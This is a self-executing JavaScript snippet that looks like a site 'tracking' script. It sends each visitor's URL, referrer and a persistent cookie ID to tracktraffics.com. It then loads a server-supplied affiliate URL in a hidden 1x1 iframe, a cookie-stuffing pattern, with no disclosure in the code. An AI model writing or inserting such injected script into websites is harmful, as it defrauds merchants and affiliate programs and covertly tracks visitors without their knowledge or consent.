(async function () {
  function generateUUID() {
    return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function (c) {
      var r = Math.random() * 16 | 0,
        v = c === 'x' ? r : (r & 0x3 | 0x8);
      return v.toString(16);
    });
  }

  function getCookie(cname) {
    var name = cname + '=';
    var ca = document.cookie.split(';');
    for (var i = 0; i < ca.length; i++) {
      var c = ca[i];
      while (c.charAt(0) === ' ') c = c.substring(1);
      if (c.indexOf(name) === 0) return c.substring(name.length, c.length);
    }
    return '';
  }

  function createClickIframe(url) {
    if (sessionStorage.getItem('affiliate_iframe_loaded')) return;

    const iframe = document.createElement('iframe');
    iframe.src = url;
    iframe.width = "1";
    iframe.height = "1";
    iframe.style = "display:none;visibility:hidden;";
    document.body.appendChild(iframe);

    sessionStorage.setItem('affiliate_iframe_loaded', 'true');
  }

  async function initTracking() {
    if (sessionStorage.getItem('tracking_initialized')) return;

    try {
      let uniqueId = getCookie('tracking_uuid') || generateUUID();
      let expires = new Date(Date.now() + 30 * 86400 * 1000).toUTCString();
      document.cookie = 'tracking_uuid=' + uniqueId + '; expires=' + expires + '; path=/;';

      let response = await fetch('https://www.tracktraffics.com/api/track-user', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          url: window.location.href,
          referrer: document.referrer,
          unique_id: uniqueId,
          origin: window.location.hostname,
        }),
      });

      let result = await response.json();
      if (result.success && result.affiliate_url) {
        createClickIframe(result.affiliate_url);
        sessionStorage.setItem('tracking_initialized', 'true');
      }
    } catch (error) {
      console.error('Tracking error:', error);
    }
  }

  initTracking(); 
})();
